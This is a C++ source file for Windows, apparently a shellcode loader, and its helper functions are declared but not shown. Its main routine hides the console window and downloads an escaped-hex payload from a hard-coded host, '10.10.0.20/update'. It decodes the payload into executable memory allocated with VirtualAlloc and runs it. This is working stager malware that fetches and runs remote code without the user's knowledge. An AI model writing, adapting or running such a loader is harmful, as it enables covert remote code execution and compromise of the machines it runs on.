#include <windows.h>
#include <iostream>

#pragma warning(disable : 4996)

using namespace std;
using std::string;

HINSTANCE  hInst;
WSADATA wsaData;

void mParseUrl(char* mUrl, string& serverName, string& filepath, string& filename);
SOCKET connectToServer(char* szServerName, WORD portNum);
int getHeaderLength(char* content);
char* readUrl2(char* szUrl, long& bytesReturnedOut, char** headerOut);

int main()
{
	// CMD Window in Hintergrund geben
	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	const int bufLen = 1024;
	char* url = (char*)"10.10.0.20/update";
	long fileSize;
	char* memBuffer;
	char* headerBuffer;
	FILE* fp;

	memBuffer = headerBuffer = NULL;

	if (WSAStartup(0x101, &wsaData) != 0)
		return -1;


	memBuffer = readUrl2(url, fileSize, &headerBuffer);


	int code_length = strlen(memBuffer);
	unsigned char* val = (unsigned char*)calloc(code_length / 4, sizeof(unsigned char));

	for (size_t count = 0; count < code_length / 4; count++)
	{
		unsigned char temp = 0;
		sscanf(memBuffer, "\\x%2hhx", &temp);
		val[count] = temp;
		memBuffer += 4;
	}

	void* exec = VirtualAlloc(0, code_length / 4, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, val, code_length / 4);
	((void(*)())exec)();

	WSACleanup();
	return 0;

}